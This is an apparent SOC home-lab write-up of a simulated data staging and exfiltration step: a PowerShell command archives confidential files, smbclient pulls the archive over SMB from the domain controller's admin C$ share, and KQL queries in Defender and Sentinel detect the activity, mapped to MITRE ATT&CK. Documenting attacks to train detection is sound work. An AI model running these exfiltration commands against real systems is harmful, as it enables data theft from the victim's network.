# 09 — Data Staging & Exfiltration

## 📥 Step 9: Data Staging & Exfiltration

The attacker identified sensitive files on `DC-01`, compressed them into a ZIP archive, and exfiltrated the archive to the Kali Linux attack machine over SMB.

---

## 1. Data Staging

The attacker compressed the contents of `C:\Confidential` into an archive stored in `C:\Users\Public`:

```powershell
Compress-Archive -Path "C:\Confidential\*" -DestinationPath "C:\Users\Public\Exfil_Data.zip" -Force
```

The staged archive contained simulated sensitive files such as:

```text
Finance_2026.txt
User_Credentials.txt
```

### Microsoft Defender for Endpoint

Defender detected `wsmprovhost.exe` creating `Exfil_Data.zip` under the context of `mylab\jsmith`.

![Microsoft Defender - Exfil Data](images/data-exfiltration/edr-data-exfil.png)

---

## 2. Data Exfiltration via SMB

The attacker used Kali Linux to access the Domain Controller's administrative `C$` share and download the staged archive over SMB:

```bash
smbclient '//192.168.10.130/c$' -U "Jsmith" -c "cd Users\Public; get Exfil_Data.zip"
```

The archive was then extracted and its contents verified:

```bash
unzip Exfil_Data.zip
cat Finance_2026.txt
```

The screenshot demonstrates the successful SMB download, extraction, and access to the simulated sensitive data.

![Kali Linux - Data Exfiltration](images/data-exfiltration/attacker-data-exfil.png)

---

## 3. SOC Detection & Investigation

Microsoft Defender was queried for the creation of the staged archive:

```kql
DeviceFileEvents
| where ActionType == "FileCreated"
| where FolderPath contains @"C:\Users\Public" or FileName contains "Exfil_Data.zip"
| project Timestamp, DeviceName, RequestAccountName, InitiatingProcessFileName, FolderPath, FileName, FileSize
| sort by Timestamp desc
```

The investigation identified:

* **Device:** `dc-01.mylab.local`
* **User:** `Jsmith`
* **Process:** `wsmprovhost.exe`
* **File:** `Exfil_Data.zip`
* **Path:** `C:\Users\Public`

![Microsoft Defender - File Creation Investigation](images/data-exfiltration/edr-events-data-exfil.png)

---

## 4. Network Investigation

Microsoft Sentinel was used to identify SMB network activity from the attacker machine:

```kql
SecurityEvent
| where EventID == 5156
| where EventData contains "192.168.10.133"
| project TimeGenerated, Computer, EventID
```

The results showed network activity from:

```text
192.168.10.133 → 192.168.10.130
TCP/445 — SMB
```

![Microsoft Sentinel - SMB Activity](images/data-exfiltration/sentinel-data-exfil.png)

---

## 5. MITRE ATT&CK Mapping

* **T1074.001 — Local Data Staging**
* **T1560.001 — Archive Collected Data**
* **T1048 — Exfiltration Over Alternative Protocol**
* **T1021.002 — SMB/Windows Admin Shares**

### Attack Flow

```text
Sensitive Files
      ↓
Compress-Archive
      ↓
Exfil_Data.zip
      ↓
C:\Users\Public
      ↓
SMB / TCP 445
      ↓
Kali Linux
      ↓
Data Extracted
```

> **Lab Scope:** All activity was performed within the isolated SOC home lab environment for defensive security research and SOC Tier 1 training.
